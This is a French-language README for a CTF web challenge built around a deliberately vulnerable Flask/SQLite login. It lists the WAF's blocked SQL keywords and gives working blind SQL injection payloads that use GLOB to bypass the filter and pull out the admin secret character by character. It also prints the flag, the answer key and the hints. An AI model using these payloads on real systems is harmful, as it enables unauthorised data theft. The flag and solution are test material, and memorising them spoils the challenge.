# CH06 - Caine : Blind SQL Injection Challenge

**Categorie** : Web
**Niveau** : DIFFICILE
**Points** : 500 (dynamic: 150 min)
**Flag** : `NHK26{bl1nd_sql1_m4st3r_t1m3_b4s3d}`

---

## 1. Description

Caine est un portail d'administration securise inspire par Grace Hopper. L'application implemente plusieurs couches de protection : un WAF basique, des messages d'erreur generiques, et un jitter aleatoire. Malgre ces protections, une vulnerabilite Blind SQL Injection persiste dans le formulaire de login.

### Contexte narratif

> Inspiree par Grace Hopper, la securite est une priorite : les erreurs SQL sont masquees, un WAF filtre les attaques, et des delais aleatoires brouillent les pistes. Mais une vulnerabilite Blind SQL Injection subsiste dans le portail admin. Ta mission : contourner les barrieres, exploiter la faille, et extraire le secret du compte administrateur.

---

## 2. Architecture technique

### Stack

| Composant | Technologie |
|-----------|-------------|
| Backend | Flask 3.0 (Python) |
| Base de donnees | SQLite (en memoire) |
| Serveur WSGI | Gunicorn |
| Conteneurisation | Docker |

### Structure des fichiers

```
web-caine/
├── challenge.yml       # Manifest CTFd
├── Dockerfile          # Image Docker
├── .dockerignore       # Exclusions Docker
├── .gitignore          # Exclusions Git
├── requirements.txt    # Dependances Python
├── app.py              # Application Flask
├── solve.py            # Script de solution (ne pas distribuer)
├── README.md           # Cette documentation
└── templates/
    └── index.html      # Interface de login
```

### Schema de la base de donnees

```sql
CREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL,
    secret TEXT
);

-- Donnees inserees
INSERT INTO users (username, password, secret) VALUES
    ('admin', 'sup3r_s3cr3t_p4ssw0rd_2024!', 'NHK26{bl1nd_sql1_m4st3r_t1m3_b4s3d}'),
    ('guest', 'guest123', 'Nothing interesting here'),
    ('user', 'user456', 'Just a regular user');
```

---

## 3. Mecanismes de securite

### 3.1 WAF (Web Application Firewall)

Le WAF bloque les mots-cles suivants (case-insensitive) :

| Mot-cle bloque | Raison |
|----------------|--------|
| `UNION` | Empeche UNION-based SQLi |
| `SELECT` | Empeche sous-requetes |
| `SLEEP` | Empeche time-based SQLi MySQL |
| `BENCHMARK` | Empeche time-based SQLi MySQL |
| `WAITFOR` | Empeche time-based SQLi MSSQL |
| `CONCAT` | Empeche concatenation |
| `CAST` | Empeche conversion de types |
| `CONVERT` | Empeche conversion de types |
| `information_schema` | Empeche enumeration des tables |
| `0x` | Empeche encodage hexadecimal |

### 3.2 Jitter aleatoire

Chaque requete subit un delai aleatoire entre **50ms et 150ms** pour compliquer les attaques time-based.

### 3.3 Suppression des erreurs

Toutes les erreurs SQL sont capturees et remplacees par un message generique.

---

## 4. Vulnerabilite

### Point d'entree

- **URL** : `http://[IP]:[PORT]/`
- **Methode** : POST
- **Parametre vulnerable** : `username`

### Comportement observable

| Condition | Message affiche | Signification |
|-----------|-----------------|---------------|
| User trouve | `Access denied` | Injection reussie, condition TRUE |
| User non trouve | `Invalid credentials` | Condition FALSE |
| WAF declenche | `Invalid credentials` | Payload bloque |

---

## 5. Deploiement CTFd

### Configuration GitLab CI

L'image est buildee automatiquement via GitLab CI et pushee sur :
```
registry.gitlab.com/mehdi-zen-group/mehdi-zen-project/challenges/web-caine:latest
```

### Manifest (challenge.yml)

```yaml
name: "Caine"
category: Web
type: dynamic
image: registry.gitlab.com/mehdi-zen-group/mehdi-zen-project/challenges/web-caine:latest
port: 5000
protocol: web
```

### Build manuel (test local)

```bash
docker build -t web-caine .
docker run -d -p 5000:5000 --name caine web-caine
curl http://localhost:5000/health
```

---

## 6. Solution

### Etape 1 : Detection de la vulnerabilite

```bash
# Test condition TRUE
curl -X POST http://localhost:5000/ -d "username=admin' AND 1=1--&password=x"
# Resultat : "Access denied"

# Test condition FALSE
curl -X POST http://localhost:5000/ -d "username=admin' AND 1=2--&password=x"
# Resultat : "Invalid credentials"
```

### Etape 2 : Bypass WAF avec GLOB

```bash
# UNION bloque
curl -X POST http://localhost:5000/ -d "username=admin' UNION SELECT 1--&password=x"
# Resultat : "Invalid credentials" (bloque)

# GLOB non bloque
curl -X POST http://localhost:5000/ -d "username=admin' AND secret GLOB 'N*'--&password=x"
# Resultat : "Access denied" (passe)
```

### Etape 3 : Extraction caractere par caractere

```
admin' AND secret GLOB 'N*'--           -> Access denied
admin' AND secret GLOB 'NH*'--          -> Access denied
admin' AND secret GLOB 'NHK*'--         -> Access denied
...
admin' AND secret GLOB 'NHK26{bl1nd_sql1_m4st3r_t1m3_b4s3d}*'-- -> Access denied
```

### Etape 4 : Script automatise

```bash
python3 solve.py -u http://[IP]:[PORT]/
```

---

## 7. Pourquoi sqlmap ne fonctionne pas

1. **WAF** : Bloque les payloads standards
2. **Jitter** : Perturbe la detection time-based
3. **Messages uniformes** : Complique la detection automatique

**Solution** : Script Python custom obligatoire.

---

## 8. Indices CTFd

| Cout | Indice |
|------|--------|
| 50 pts | Un WAF bloque les mots-cles SQL classiques. Cherche des alternatives SQLite. |
| 75 pts | Les fonctions LIKE, GLOB, LENGTH et SUBSTR ne sont pas bloquees. |
| 100 pts | Utilise GLOB avec des wildcards : `secret GLOB 'prefix*'` pour extraire caractere par caractere. |

---

## 9. Tests de validation

```bash
# Test 1 : Health check
curl -s http://localhost:5000/health | grep -q "ok" && echo "PASS"

# Test 2 : WAF actif
curl -s -X POST http://localhost:5000/ -d "username=admin' UNION SELECT--&password=x" \
  | grep -q "Invalid credentials" && echo "PASS: WAF OK"

# Test 3 : Blind SQLi exploitable
curl -s -X POST http://localhost:5000/ -d "username=admin' AND secret GLOB 'NHK26*'--&password=x" \
  | grep -q "Access denied" && echo "PASS: SQLi OK"
```

---

## 10. Version

- **Challenge** : CH06 - Caine
- **Version** : 1.0
- **Categorie** : Web / SQLi
- **Difficulte** : DIFFICILE
